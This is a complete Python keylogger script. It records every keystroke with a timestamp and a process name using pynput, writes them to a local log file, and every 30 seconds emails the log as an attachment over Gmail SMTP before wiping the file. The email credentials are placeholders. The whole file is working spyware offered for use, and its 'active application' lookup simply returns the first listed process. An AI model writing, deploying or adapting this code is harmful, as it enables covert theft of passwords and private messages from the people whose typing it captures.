from pynput import keyboard  # Module to capture keystrokes
import smtplib, threading, os  # Modules for sending emails and running background tasks
from email.message import EmailMessage  # Module to format email messages
from datetime import datetime  # Module to capture timestamps
import psutil  # Module to get active application information

# File to store captured keystrokes
log_file = "keylog.txt"

# Function to get the active application name
# This helps in identifying which application was being used when a key was pressed
def get_active_application():
    for process in psutil.process_iter(attrs=['pid', 'name']):
        try:
            return process.info['name']  # Return the name of the active process
        except(psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue  # Ignore processes that are not accessible
    return "Unknown"  # Return "Unknown" if no application is found

# Function to capture keystrokes and write them to the log file
def on_press(key):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Get current timestamp
        app_name = get_active_application()  # Get currently active application
        
        # If the key pressed is a regular character, log it directly
        with open(log_file, "a") as f:
            f.write(f"{timestamp} - {app_name} - {key.char}\n")
    except AttributeError:
        # If the key pressed is a special key (Enter, Shift, etc.), format it differently
        with open(log_file, "a") as f:
            f.write(f"{timestamp} - {app_name} - [{key}]\n")

# Function to send an email with the keylog file as an attachment
def send_email():
    sender_email = "your_email@example.com"  # Sender's email address
    receiver_email = "recipient_email@example.com"  # Recipient's email
    password = "your_secure_password"  # App password (use App Passwords for security)

    # Check if the log file exists and contains data before sending
    if os.path.exists(log_file) and os.path.getsize(log_file) > 0:
        msg = EmailMessage()  # Create an email message object
        msg["Subject"] = "Keylog Data"  # Email subject
        msg["From"] = sender_email  # Sender email
        msg["To"] = receiver_email  # Recipient email
        msg.set_content("Attached is keylog.txt file")  # Email body content

        # Attach the keylog file to the email
        with open(log_file, "rb") as f:
            msg.add_attachment(f.read(), maintype="text", subtype="plain", filename="keylog.txt")
    
        try:
            # Set up SMTP connection to send email
            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.starttls()  # Secure the connection
                server.login(sender_email, password)  # Login using sender email credentials
                server.send_message(msg)  # Send the email
            print("Email sent successfully")
        except smtplib.SMTPAuthenticationError:
            print("Authentication error: Invalid email or password")
        except smtplib.SMTPConnectError:
            print("Connection error: Check your internet connection")
        except smtplib.SMTPException as e:
            print("SMTP error:", e)
        except Exception as e:
            print("Unknown error:", e)
        
        # Clear the log file after sending email
        open(log_file, "w").close()
    
    # Schedule the next email to be sent after 30 seconds
    threading.Timer(30, send_email).start()

# Function to start the keylogger
def start_keylogger():
    send_email()  # Start sending emails in the background
    with keyboard.Listener(on_press=on_press) as listener:  # Start listening for keystrokes
        listener.join()  # Keep the program running

# Run the keylogger when the script is executed
if __name__ == "__main__":
    start_keylogger()
